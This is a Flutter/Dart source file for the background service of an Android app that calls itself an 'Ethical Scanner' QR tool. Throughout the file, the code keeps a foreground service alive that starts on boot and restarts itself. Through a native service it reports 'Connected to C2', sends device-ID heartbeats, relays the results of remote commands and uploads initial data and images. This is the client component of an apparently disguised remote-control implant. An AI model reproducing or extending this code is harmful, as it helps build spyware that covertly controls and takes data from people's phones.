// lib/services/background_service.dart
// Simplified version that uses IPC to communicate with native service

import 'dart:async';
import 'dart:isolate';
import 'dart:ui';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidConfiguration;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:camera/camera.dart' show XFile;
import 'package:shared_preferences/shared_preferences.dart';

import '../config/app_config.dart';
import '../utils/constants.dart';
import 'device_info_service.dart';
import 'network_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DeviceInfoService deviceInfoService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.deviceInfoService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
  });
}

Timer? _heartbeatTimer;
Timer? _nativeServiceMonitorTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;

// IPC method channel for communicating with native service
const MethodChannel _ipcChannel = MethodChannel('com.example.kem.ipc');

// Event channel for receiving broadcasts from native service
const EventChannel _connectionStatusChannel = EventChannel('com.example.kem.connection_status');
const EventChannel _commandResultChannel = EventChannel('com.example.kem.command_results');

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final network = NetworkService();
  final deviceInfo = DeviceInfoService();
  final prefs = await SharedPreferences.getInstance();
  final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
  
  debugPrint("BackgroundService: Starting with DeviceID = $deviceId (IPC Mode with Native Service)");

  final handles = BackgroundServiceHandles(
    networkService: network,
    deviceInfoService: deviceInfo,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
  );

  service.invoke('update', {
    'device_id': deviceId,
    'mode': 'IPC with Native Service',
    'native_service_status': 'Checking...'
  });

  // Setup IPC communication with native service
  _setupIPCCommunication(handles);
  
  // Ensure native service is running
  await _ensureNativeServiceRunning(handles);

  // Handle initial data sending
  _setupInitialDataHandler(handles);

  // Handle service stop
  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    await _stopService(handles);
  });

  // Monitor native service health
  _startNativeServiceMonitoring(handles);
}

void _setupIPCCommunication(BackgroundServiceHandles h) {
  // Listen for connection status from native service
  _connectionStatusChannel.receiveBroadcastStream().listen(
    (dynamic event) {
      if (event is Map) {
        final connected = event['connected'] as bool? ?? false;
        final deviceId = event['deviceId'] as String? ?? 'unknown';
        
        debugPrint("BackgroundService: Native service connection status: $connected");
        
        h.serviceInstance.invoke('update', {
          'native_connection_status': connected ? 'Connected to C2' : 'Disconnected from C2',
          'device_id': deviceId,
        });
        
        if (connected) {
          _startHeartbeat(h);
        } else {
          _stopHeartbeat();
        }
      }
    },
    onError: (error) {
      debugPrint("BackgroundService: Connection status stream error: $error");
    }
  );

  // Listen for command results from native service
  _commandResultChannel.receiveBroadcastStream().listen(
    (dynamic event) {
      if (event is Map) {
        final command = event['command'] as String?;
        final success = event['success'] as bool? ?? false;
        final resultString = event['result'] as String? ?? '{}';
        
        debugPrint("BackgroundService: Command result - $command: $success");
        
        h.serviceInstance.invoke('update', {
          'last_command': command,
          'last_command_status': success ? 'Success' : 'Failed',
          'last_update': DateTime.now().toIso8601String(),
        });
      }
    },
    onError: (error) {
      debugPrint("BackgroundService: Command result stream error: $error");
    }
  );
}

Future<void> _ensureNativeServiceRunning(BackgroundServiceHandles h) async {
  try {
    // Try to communicate with native service
    final result = await _ipcChannel.invokeMethod('ping');
    
    if (result == 'pong') {
      debugPrint("BackgroundService: Native service is running and responsive");
      h.serviceInstance.invoke('update', {'native_service_status': 'Running & Responsive'});
    } else {
      debugPrint("BackgroundService: Native service ping failed, attempting to start");
      await _startNativeService(h);
    }
  } catch (e) {
    debugPrint("BackgroundService: Error communicating with native service: $e");
    await _startNativeService(h);
  }
}

Future<void> _startNativeService(BackgroundServiceHandles h) async {
  try {
    await _ipcChannel.invokeMethod('startNativeService', {
      'deviceId': h.currentDeviceId,
    });
    
    debugPrint("BackgroundService: Native service start command sent");
    h.serviceInstance.invoke('update', {'native_service_status': 'Starting...'});
    
    // Wait a bit and check again
    await Future.delayed(const Duration(seconds: 3));
    await _ensureNativeServiceRunning(h);
    
  } catch (e) {
    debugPrint("BackgroundService: Failed to start native service: $e");
    h.serviceInstance.invoke('update', {'native_service_status': 'Failed to Start'});
  }
}

void _startNativeServiceMonitoring(BackgroundServiceHandles h) {
  _nativeServiceMonitorTimer = Timer.periodic(const Duration(seconds: 60), (_) async {
    try {
      final result = await _ipcChannel.invokeMethod('ping');
      
      if (result != 'pong') {
        debugPrint("BackgroundService: Native service health check failed, restarting");
        await _startNativeService(h);
      }
    } catch (e) {
      debugPrint("BackgroundService: Native service monitoring error: $e");
      await _startNativeService(h);
    }
  });
}

void _setupInitialDataHandler(BackgroundServiceHandles h) {
  h.serviceInstance.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((Map<String, dynamic>? argsFromUi) async {
    final alreadySent = h.preferences.getBool(PREF_INITIAL_DATA_SENT) ?? false;

    h.serviceInstance.invoke('update', {'initial_data_status': 'Processing...'});

    if (alreadySent && argsFromUi == null) {
      debugPrint("BackgroundService: Initial data already marked as sent, and no new UI trigger.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Already Sent'});
      return;
    }

    if (argsFromUi == null) {
      debugPrint("BackgroundService: argsFromUi is null for BG_SERVICE_EVENT_SEND_INITIAL_DATA, cannot send.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - No UI Data'});
      return;
    }

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;
    
    if (jsonData == null) {
      debugPrint("BackgroundService: jsonData is null within argsFromUi, cannot send initial data.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - JSON Data Null'});
      return;
    }

    try {
      // Send initial data via IPC to native service
      final result = await _ipcChannel.invokeMethod('sendInitialData', {
        'jsonData': jsonData,
        'imagePath': imagePath,
        'deviceId': h.currentDeviceId,
      });
      
      if (result == true) {
        await h.preferences.setBool(PREF_INITIAL_DATA_SENT, true);
        debugPrint("BackgroundService: Initial data sent successfully via native service");
        h.serviceInstance.invoke('update', {'initial_data_status': 'Sent Successfully via Native'});
      } else {
        debugPrint("BackgroundService: Failed to send initial data via native service");
        h.serviceInstance.invoke('update', {'initial_data_status': 'Failed to Send via Native'});
      }
    } catch (e) {
      debugPrint("BackgroundService: Error sending initial data via IPC: $e");
      h.serviceInstance.invoke('update', {'initial_data_status': 'IPC Error: $e'});
    }
  });
}

void _startHeartbeat(BackgroundServiceHandles h) {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) async {
    try {
      // Send heartbeat via native service
      await _ipcChannel.invokeMethod('sendHeartbeat', {
        'deviceId': h.currentDeviceId,
        'timestamp': DateTime.now().toIso8601String(),
      });
      
      h.serviceInstance.invoke('update', {
        'current_date': DateTime.now().toIso8601String(),
        'device_id': h.currentDeviceId,
        'heartbeat_status': 'Sent via Native',
      });
    } catch (e) {
      debugPrint("BackgroundService: Error sending heartbeat via IPC: $e");
    }
  });
  
  debugPrint("BackgroundService: Heartbeat started via native service for Device ID: ${h.currentDeviceId}");
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint("BackgroundService: Heartbeat stopped");
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  debugPrint("BackgroundService: Received stop service event. Stopping...");
  
  _stopHeartbeat();
  _nativeServiceMonitorTimer?.cancel();
  
  // Stop native service
  try {
    await _ipcChannel.invokeMethod('stopNativeService');
  } catch (e) {
    debugPrint("BackgroundService: Error stopping native service: $e");
  }
  
  await h.serviceInstance.stopSelf();
  
  debugPrint("BackgroundService: Service stopped.");
}

Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();

  final flnp = FlutterLocalNotificationsPlugin();
  const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
  const initSettings = InitializationSettings(android: androidInit);

  try {
    await flnp.initialize(initSettings);
    debugPrint("FlutterLocalNotificationsPlugin initialized successfully.");
  } catch (e, s) {
    debugPrint("Error initializing FlutterLocalNotificationsPlugin: $e\n$s");
  }

  const channel = AndroidNotificationChannel(
    'qr_scanner_service_channel',
    'Ethical Scanner Service',
    description: 'Background service for the Ethical Scanner application with native IPC.',
    importance: Importance.high,
    playSound: false,
    enableVibration: false,
    showBadge: true,
  );

  final AndroidFlutterLocalNotificationsPlugin? androidImplementation =
      flnp.resolvePlatformSpecificImplementation<AndroidFlutterLocalNotificationsPlugin>();

  if (androidImplementation != null) {
    try {
      await androidImplementation.createNotificationChannel(channel);
      debugPrint("Notification channel 'qr_scanner_service_channel' created successfully.");
    } catch (e, s) {
      debugPrint("Error creating notification channel: $e\n$s");
    }
  }

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'qr_scanner_service_channel',
      initialNotificationTitle: 'Ethical Scanner Active (Native IPC Mode)',
      initialNotificationContent: 'Commands handled by native service with direct C2 connection.',
      foregroundServiceNotificationId: 888,
      autoStartOnBoot: true,
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: onStart,
    ),
  );
  
  debugPrint("Background service configured for native IPC communication.");
}